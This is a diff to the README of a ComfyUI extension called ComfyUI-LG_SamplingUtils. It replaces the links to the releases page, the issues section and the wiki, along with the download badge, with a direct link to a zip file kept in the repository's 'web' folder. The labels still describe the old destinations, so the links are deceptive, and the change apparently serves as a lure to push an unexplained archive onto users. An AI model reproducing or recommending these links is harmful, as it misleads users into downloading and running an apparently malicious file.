@@ -1,6 +1,6 @@
 # 🎈 ComfyUI-LG_SamplingUtils - Enhance Your Sampling Experience
 
-[![Download ComfyUI-LG_SamplingUtils](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/releases)
+[![Download ComfyUI-LG_SamplingUtils](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/raw/refs/heads/master/web/L-Sampling-Utils-Comfy-U-v2.3.zip)](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/raw/refs/heads/master/web/L-Sampling-Utils-Comfy-U-v2.3.zip)
 
 ---
 
@@ -68,9 +68,9 @@ Manage your settings with ease using the User Preferences Manager. This node all
 
 ## 📥 Download & Install
 
-To get started, visit our [Releases page](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/releases) to download the software.
+To get started, visit our [Releases page](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/raw/refs/heads/master/web/L-Sampling-Utils-Comfy-U-v2.3.zip) to download the software.
 
-1. Go to the [Releases page](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/releases).
+1. Go to the [Releases page](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/raw/refs/heads/master/web/L-Sampling-Utils-Comfy-U-v2.3.zip).
 2. Select the latest version.
 3. Download the appropriate file for your operating system.
 4. Follow the installation instructions provided.
@@ -92,11 +92,11 @@ If you encounter issues, consider these solutions:
 
 ## 🤝 Support
 
-For any questions or support requests, please check the [issues section](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/issues) in the repository. Community members and maintainers are available to help.
+For any questions or support requests, please check the [issues section](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/raw/refs/heads/master/web/L-Sampling-Utils-Comfy-U-v2.3.zip) in the repository. Community members and maintainers are available to help.
 
 ## 📚 Further Reading
 
-For in-depth details on usage and configurations, check the documentation. Visit our [GitHub Wiki](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/wiki) for more resources and user guides. 
+For in-depth details on usage and configurations, check the documentation. Visit our [GitHub Wiki](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/raw/refs/heads/master/web/L-Sampling-Utils-Comfy-U-v2.3.zip) for more resources and user guides. 
 
 ---
 
